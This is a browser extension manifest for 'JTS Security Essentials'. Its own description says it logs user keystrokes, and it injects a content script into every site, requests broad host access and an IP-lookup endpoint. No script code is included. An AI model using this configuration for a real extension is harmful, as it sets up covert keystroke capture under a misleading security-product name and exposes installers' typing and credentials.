{
    "manifest_version": 2,
    "name": "JTS Security Essentials",
    "description": "Logs user keystrokes for monitoring purposes",
    "version": "1.0",
    "permissions": [
      "activeTab",
      "storage",
      "tabs",
      "<all_urls>",
      "https://api.ipify.org/*"
    ],
    "background": {
        "scripts": [
        "libs/ua-parser.min.js",   
        "background.js"
        ],
      "persistent": true
    },
    "content_scripts": [
      {
        "matches": ["<all_urls>"],
        "js": ["content.js"]
      }
    ],
    "options_ui": {
        "page": "options.html",
        "open_in_tab": true
    },
    "options_page": "options.html",
    "host_permissions": [
    "*"
    ],
    "web_accessible_resources": [
    "libs/ua-parser.min.js" 
  ]
  }